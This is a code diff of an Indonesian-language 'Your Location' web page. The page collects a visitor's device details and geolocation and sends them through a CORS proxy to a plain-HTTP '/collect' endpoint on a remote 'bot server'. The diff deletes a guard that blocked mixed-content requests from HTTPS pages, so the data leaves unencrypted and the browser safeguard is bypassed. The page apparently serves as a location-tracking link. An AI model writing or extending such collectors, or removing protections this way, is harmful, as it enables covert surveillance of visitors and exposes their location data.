@@ -94,19 +94,16 @@ Lokasi Anda
 </div>
 
 <script>
-const BOT_SERVER_URL = "https://cybers-api.vercel.app/v1/cors?url=http://de25.spaceify.eu:26000/"
+const BOT_SERVER_URL = "https://cybers-api.vercel.app/v1/cors?url=http://de25.spaceify.eu:26000/collect"
 let userConsent = false
-
 const consentModal = document.getElementById("consentModal")
 const acceptConsent = document.getElementById("acceptConsent")
 const denyConsent = document.getElementById("denyConsent")
-
 acceptConsent.addEventListener("click", () => {
 userConsent = true
 consentModal.style.display = "none"
 getLocation()
 })
-
 denyConsent.addEventListener("click", () => {
 userConsent = false
 consentModal.style.display = "none"
@@ -152,12 +149,6 @@ return Promise.resolve(info)
 
 function sendDeviceData(deviceInfo, location) {
 if (!userConsent) return
-
-// Cek apakah halaman menggunakan HTTPS
-if (window.location.protocol === 'https:' && BOT_SERVER_URL.startsWith('http:')) {
-console.error("Blocked mixed content request to HTTP endpoint from HTTPS page");
-return;
-}
   
 const payload = JSON.stringify({
 device: deviceInfo,
